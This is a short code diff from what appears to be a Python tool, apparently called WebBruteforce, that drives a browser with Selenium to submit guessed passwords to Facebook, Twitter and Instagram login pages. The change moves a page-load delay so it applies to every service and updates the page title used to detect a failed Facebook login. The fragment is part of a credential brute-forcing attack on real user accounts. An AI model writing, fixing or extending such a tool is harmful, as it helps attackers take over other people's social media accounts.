@@ -98,11 +98,13 @@ class WebBruteforce(object):
                 elem.send_keys(password)
                 elem.send_keys(Keys.RETURN)
                 
+                sleep(delay) # need to wait for page to load, sleep for delay seconds.
+
+                
                 # Check for changes in driver.title 
                 if service == "facebook":
-                    assert (("Welcome to Facebook") in driver.title)
+                    assert (("Facebook - Log In or Sign Up") in driver.title)
                 elif service == "twitter":
-                    sleep(delay) # need to wait for page to load, sleep for delay seconds.
                     assert (("Twitter") in driver.title)
                 elif service == "instagram":
                     assert (("Login") in driver.title)
